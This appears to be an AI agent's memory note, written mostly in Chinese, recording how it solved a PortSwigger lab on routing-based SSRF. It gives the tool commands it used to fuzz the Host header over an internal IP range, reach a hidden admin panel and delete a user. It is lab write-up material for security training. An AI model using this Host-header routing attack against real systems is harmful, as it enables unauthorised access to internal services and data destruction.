---
metadata:
  node_type: memory
name: "lab-host-header-routing-based-ssrf arm A"
description: "Routing-based SSRF arm A: Host header 192.168.0.153 routed to internal admin panel; deleting carlos gave the solved banner."
last_updated: 2026-10-11T02:53:38+08:00
created: 2026-10-11T02:53:38+08:00
---

题: PortSwigger /web-security/host-header/exploiting/lab-host-header-routing-based-ssrf (widget-lab-id 2744F28D772F25B5878C7FBA870871916535BC5AE1458431FB62C5517346C62E)

路径: range_launch launch-url 直接吃 canonical 路径 → 实例 0a26003904db0a7a805862d0004d00d9,jar /tmp/cj1.json,reused:false(无残留)。

方法(开卷题面即方法): 前端按 Host 头路由到后端。
1. header_scan <instance>/ Host 192.168.0.FUZZ --ids 1-254 → 253 个 504(网关连不上 192.168.0.N),唯 1 个命中: 192.168.0.153 返回 302。
   耗时 278s(串行 254 请求),单件完成不需分片。
2. http_dump <instance>/admin --header 'Host: 192.168.0.153' → 200,内网 admin 面板,表单 action=/admin/delete method=POST,带 csrf 隐藏域 + username 文本框。
3. http_session post <instance>/admin/delete --header 'Host: 192.168.0.153' --form csrf=... --form username=carlos --follow
   首跳 302 Location /(删除成功);--follow 的第二跳变成 GET 带 body 被前端 403 "GET requests cannot contain a body"(无害,首跳已生效)。
4. banner_verdict → solved:true, "Congratulations, you solved the lab!";admin 页复查 200。

要点: Host 头覆盖在 ureq 客户端上生效(header_scan/http_dump/http_session 同一客户端族,URL 仍指向前端,Host 决定路由);301/302 即为路由命中信号,不必等 2xx。绝对不要为取号另调 page_read。

